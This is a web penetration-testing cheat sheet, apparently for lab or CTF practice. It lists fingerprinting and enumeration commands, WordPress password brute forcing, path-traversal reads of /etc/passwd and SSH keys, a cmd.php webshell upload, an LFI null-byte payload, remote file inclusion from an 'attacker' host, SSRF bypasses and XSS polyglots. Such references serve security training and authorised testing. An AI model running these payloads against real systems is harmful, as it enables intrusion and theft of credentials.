# Web technology related commands

---

## Triage — Where To Start

Fingerprint the application before fuzzing it. A product name plus a version routes you to a
known exploit in minutes; a directory brute-force against an unidentified app can burn an hour
and tell you nothing. Content discovery is the fallback, not the opening move.

```text
  unknown app -> identified stack -> reachable surface -> a vuln class -> code exec / data
```

### Classify the app

| What you see                                 | It's a...            | Go straight to                     |
| -------------------------------------------- | -------------------- | ---------------------------------- |
| Known product + version (WordPress, Jenkins) | Known-CVE target     | Search the version, do not fuzz    |
| Custom app, session cookie, login form       | Bespoke app          | Auth, IDOR, injection              |
| `/api/`, JSON responses, JWT bearer tokens   | API                  | Swagger/OpenAPI, then JWT attacks  |
| Static HTML, no forms, no cookies            | Thin surface         | vhosts — the real app is elsewhere |
| Admin panel on 8080/8443/9090                | Management interface | Default credentials, always first  |
| Any file upload or document preview          | High-value sink      | Upload abuse -> webshell           |

```bash
whatweb -a 3 "$URL"
curl -skI "$URL"
curl -sk "$URL/favicon.ico" | md5sum        # favicon hash identifies stripped stacks
for p in robots.txt sitemap.xml .git/HEAD .env swagger.json; do
  printf '%-16s %s\n' "$p" "$(curl -sk -o /dev/null -w '%{http_code}' "$URL/$p")"
done
```

`.git/HEAD` returning 200 is full source disclosure — `git-dumper "$URL/.git/" out/`.

### Map the surface, in this order

1. **Virtual hosts and subdomains** — the most-missed surface. One IP serves different apps by
   `Host:` header, and the default page is often a decoy.
2. **Paths and files** — section 1 below. Set extensions from the stack, not the default list.
3. **Parameters** — hidden inputs on pages you already have (`arjun`, `x8`, or ffuf a param list).

Filter by response size or the results are meaningless — a soft-404 app answers 200 for
everything. Use `ffuf -ac`, or establish the baseline and `-fs` it out.

### Vulnerability class selector

| Observation                                   | Class                 | Where                              |
| --------------------------------------------- | --------------------- | ---------------------------------- |
| Param names a file (`?page=`, `?file=`)       | Traversal / LFI / RFI | section below, `common injections` |
| Param reaches a shell (ping, convert, export) | Command injection     | `common injections`                |
| Input echoed through a template               | SSTI                  | `common injections`                |
| SQL errors, ORDER BY changes behaviour        | SQL injection         | `common injections`                |
| XML accepted anywhere (SOAP, SAML, DOCX, SVG) | XXE                   | `common injections`                |
| Serialised blob in a cookie or parameter      | Deserialisation       | `common web_checklist`             |
| Server fetches a URL you control              | SSRF                  | section below                      |
| Numeric or guessable object reference         | IDOR                  | section below                      |
| Input reflected into the page unescaped       | XSS                   | section below                      |
| File upload of any kind                       | Upload -> RCE         | `common phpdangerousfuncs`         |

### Stuck?

Stuck on web almost always means unmapped surface, not an unfound payload.

- [ ] Enumerated vhosts as well as subdomains?
- [ ] Fuzzed with extensions matching the stack?
- [ ] Mined JavaScript for endpoints, keys and commented-out routes?
- [ ] Checked robots.txt, sitemap.xml, .git/, .env, and backup suffixes (.bak, .old, ~)?
- [ ] Searched the exact product *and version* for CVEs?
- [ ] Tried default credentials on every admin interface?
- [ ] Tested headers as parameters (X-Forwarded-For, X-Original-URL, Referer)?
- [ ] Used an out-of-band channel for blind classes?
- [ ] Re-crawled **authenticated**? That surface is usually larger.
- [ ] Walked `common web_checklist` for a class you have not considered at all?

### One-line version

Fingerprint before fuzzing -> map vhosts, paths, params -> find where input meets a sink ->
prove blind cases out of band -> escalate to code exec -> re-crawl authenticated and repeat.

A version number beats a wordlist.

---

## Directory & File Enumeration

### Gobuster

- Directories:
  ```bash
  gobuster dir -u $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gb_directories
  ```
- Files:
  ```bash
  gobuster dir -u $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-large-files.txt -o gb_files
  ```
- All (multiple useful wordlists/extensions):
  ```bash
  gobuster dir -u $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/big.txt -o gb_all
  gobuster dir -u $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/big.txt -o gb_all -x php,asp,txt,md,html
  gobuster dir -u $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-large-words.txt -o gb_all
  ```
- Vhosts:
  ```bash
  gobuster vhost -u $URL -w $WORDLISTS/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
  ```

### FFuF

```bash
ffuf -w $WORDLISTS/dirb/big.txt -u $URL/FUZZ
```

### Feroxbuster

```bash
feroxbuster --url $URL
feroxbuster --url $URL -w $WORDLISTS/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```

### Alternative Wordlists

| Count  | Path                                                                                |
| ------ | ----------------------------------------------------------------------------------- |
| 137771 | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/combined_directories.txt`     |
| 127383 | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt`   |
| 22056  | `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`                      |
| 20469  | `/usr/share/dirb/wordlists/big.txt`                                                 |
| 14170  | `/usr/share/dirbuster/wordlists/directory-list-1.0.txt`                             |
| 12833  | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/combined_words.txt`           |
| 11960  | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt`         |
| 8766   | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` |
| 8701   | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/LinuxFileList.txt`            |
| 2565   | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/quickhits.txt`                |

### Extensions

| no  | File Type    | Uses                                        |
| --- | ------------ | ------------------------------------------- |
| 1   | `.yaml,.yml` | Config files especially on flat cms systems |

### API Enumeration

| Count | Path                                                                             |
| ----- | -------------------------------------------------------------------------------- |
| 268   | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt`     |
| 3132  | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/api/objects.txt`           |
| 12334 | `/opt/w1ld0s/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt` |

---

## Vulnerability Scanning

### Nuclei

```bash
nuclei -u $URL -o nuclei-scan
```

---

## WordPress Enumeration

### WPScan

- Basic Scan:
  ```bash
  wpscan --url $URL
  ```
- Plugins, Users, Themes:
  ```bash
  wpscan --url $URL -e vt,vp,u --api-token $WP_SCAN_API
  ```
- Brute Force Users:
  ```bash
  wpscan --url $URL -P $ROCKYOU
  ```

---

## IIS/WebDAV Exploits

```bash
nmap -T5 -p80 --script=http-iis-webdav-vuln $IP
nmap --script http-webdav-scan -p80 $IP
```

---

## Curl Tricks

- Path Traversal:
  ```bash
  curl --path-as-is $URL:3000/public/plugins/welcome/../../../../../../../../etc/passwd
  ```
  * `--path-as-is` preserves traversal attempts

- File Upload:
  ```bash
  curl -F "name=test" -F "class_id=1" -F "subject_id=1" -F "timestamp=2021-12-08" \
  -F "teacher_id=1" -F "file_type=txt" -F "status=1" -F "description=123123" \
  -F "_wysihtml5_mode=1" -F filename=@cmd.php
  ```

---

## Favicon Fingerprinting

- [OWASP Favicon DB](https://wiki.owasp.org/index.php/OWASP_favicon_database)
- Get hash:
  ```bash
  curl http://target/favicon.ico | md5sum
  TARGET=$URL/favicon.ico
  HASH=$(curl $TARGET | md5sum | cut -d ' ' -f 1)
  curl -s https://wiki.owasp.org/index.php/OWASP_favicon_database | grep $HASH
  ```

---

## Sitemap.xml Discovery

```bash
curl $URL/sitemap.xml 
curl $URL/sitemap.xml | grep loc
```

---

## Header Review

```bash
curl -v -I http://target
```

---

## Subdomain & VHost Enumeration

- Certificate
  Transparency: [crt.sh](http://crt.sh/) | [entrust.com](https://ui.ctsearch.entrust.com/ui/ctsearchui)
- dnsrecon:
  ```bash
  dnsrecon -t brt -d target.com
  dnsrecon -t brt -d $URL
  ```
- Sublist3r:
  ```bash
  sublist3r -d target.com
  sublist3r -d $URL
  ```
- amass:
  ```bash
  amass intel -whois -d example.com
  amass enum -d example.com
  ```
- Gobuster vhost:
  ```bash
  gobuster vhost -u $URL -w $WORDLISTS/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
  ```
- FFuF vhost:
  ```bash
  ffuf -w $WORDLISTS/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.196.56
  ```

---

## Authentication Bypass & Username Enumeration

- FFuF for username existence:
  ```bash
  ffuf -w $WORDLISTS/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.245.78/customers/signup -mr "username already exists"
  ```

---

## IDOR (Insecure Direct Object Reference)

- Access resources not belonging to you.

---

## File Inclusion

### Path Traversal

- Common vulnerable PHP function:
  ```php
  get_file_contentes
  ```
- Common files:
  * `/etc/issue`, `/etc/profile`, `/proc/version`, `/etc/passwd`,
    `/etc/shadow`, `/root/.bash_history`, `/var/log/dmessage`,
    `/var/mail/root`, `/root/.ssh/id_rsa`, `/var/log/apache2/access.log`,
    `c:\boot.ini`

### Local File Inclusion

- Vulnerable PHP functions:
  ```php
  include
  require
  include_once
  require_once
  ```
- Null byte bypass (pre PHP 5.3.4):
  ```php
  /lab3.php?file=../../../../etc/passwd%00")
  ```

### Remote File Inclusion

  ```php
  /lab3.php?file=http://attacker/file
  ```

---

## SSRF (Server-side Request Forgery)

- External request
  capture: [requestbin.com](http://requestbin.com) | [webhook.site](https://webhook.site)
- Path manipulation:
  * `../../` to change API path
  * `&x=` to nullify rest of line
- Localhost bypasses:
  ```bash
  http://0
  http://0.0.0.0
  http://0000
  http://127.1
  http://127.*.*.*
  http://2130706433
  http://017700000001
  http://127.0.0.1.nip.ip
  ```
- Cloud metadata:
  * `169.254.169.254`
- DNS-based bypass:
  * `http://website.com.whirley.com`

---

## Open Redirect

- Tracking endpoints that redirect to next page.

---

## XSS (Cross-site Scripting)

- Polyglot payloads:
  ```javascript
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror = alert('THM'))//%0D%0A%0d%0a//
  < /stYle/
  </titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
  ```
